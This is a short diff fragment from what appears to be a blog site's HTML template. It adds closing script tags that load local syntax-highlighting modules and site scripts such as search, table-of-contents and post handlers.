+  <script src="/axiom-blog-site/static/js/hljs-gradle.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-groovy.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-haskell.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-kotlin.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-latex.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-lisp.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-nim.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-nix.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-ocaml.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-pgsql.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-protobuf.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-scala.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-vim.min.js"></script>
+  <script src="/axiom-blog-site/static/js/search.js?v=1"></script>
+  <script src="/axiom-blog-site/static/js/animations.js?v=3"></script>
+  
+  <script src="/axiom-blog-site/static/js/crypto.js?v=2"></script>
+  <script src="/axiom-blog-site/static/js/app.js?v=3"></script>
+  <script src="/axiom-blog-site/static/js/toc.js?v=7"></script>
+  <script src="/axiom-blog-site/static/js/post.js?v=4"></script>
+
+</body>
+</html>
